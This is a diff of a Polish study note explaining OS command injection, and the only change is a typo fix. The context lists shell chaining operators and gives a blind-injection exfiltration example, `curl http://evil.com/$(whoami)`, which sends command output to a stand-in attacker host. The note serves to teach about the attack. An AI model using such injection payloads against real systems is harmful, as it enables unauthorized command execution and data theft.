@@ -25,7 +25,7 @@ Jest to atak, w którym atakujący wstrzykuje polecenie systemowe w dane wejści
 	- `|` - przekazuje wynik jednego polecenia do drugiego, 
 	- `&&` - wykonaj drugie, jeśli pierwsze się uda, 
 	- `||` - wykonaj drugie polecenie, jeśli pierwsze się nie uda, 
-	- `$(uname -a)` - wykonaj polecenie wstaw wynik w to miejsce,
+	- `$(uname -a)` - wykonaj polecenie i wstaw wynik w to miejsce,
 	- `` ` `` - wykonaj polecenie w środku (backtick),
 - Blind Command Injection - gdy aplikacja nie pokazuje wyniku polecenia, atakujący nadal może je wykonać i wnioskować wynik z zachowania serwera (np. czas odpowiedzi, kod błędu, żądanie do zewnętrznego serwera). Atakujący może także wysłać wynik do swojego serwera - np. `curl http://evil.com/$(whoami)`.  
 
